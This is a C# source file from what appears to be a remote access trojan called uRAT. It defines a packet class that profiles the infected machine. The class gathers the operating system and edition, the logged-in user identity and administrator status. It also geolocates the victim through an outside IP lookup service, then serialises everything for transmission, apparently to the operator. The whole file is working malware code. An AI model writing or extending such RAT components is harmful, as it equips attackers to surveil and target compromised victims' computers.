using System.IO;
using System.Net;
using System.Security.Principal;
using uNet2.Packet;
using uRAT.CoreClientPlugin.Tools;

namespace uRAT.CoreClientPlugin.BasicSystemInformation.Packets
{
    public class SystemInformationPacket : IDataPacket
    {
        public int PacketId
        {
            get { return 1; }
        }

        public string OperatingSystem { get; set; }
        public string ComputerName { get; set; }
        public string CountryCode { get; set; }
        public string IsAdmin { get; set; }


        public void SerializeTo(Stream stream)
        {
            var friendlyName = SystemInformationHelper.Name;
            var edition = SystemInformationHelper.Edition;
            var ptrSize = SystemInformationHelper.Bits;
            var sp = SystemInformationHelper.ServicePack;
            OperatingSystem = string.Concat(friendlyName, " ", edition, " x", +ptrSize, " ", sp);
            ComputerName = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
            var rawStr = new WebClient().DownloadString("http://ip-api.com/csv");
            CountryCode = string.Concat(rawStr.Split(',')[1], " (", rawStr.Split(',')[2], ")");
            IsAdmin = SystemInformationHelper.IsAdministrator() ? "True" : "False";

            var bw = new BinaryWriter(stream);
            bw.Write(PacketId);
            bw.Write(OperatingSystem);
            bw.Write(ComputerName);
            bw.Write(CountryCode);
            bw.Write(IsAdmin);
        }

        public void DeserializeFrom(Stream stream)
        {

        }

 
    }
}
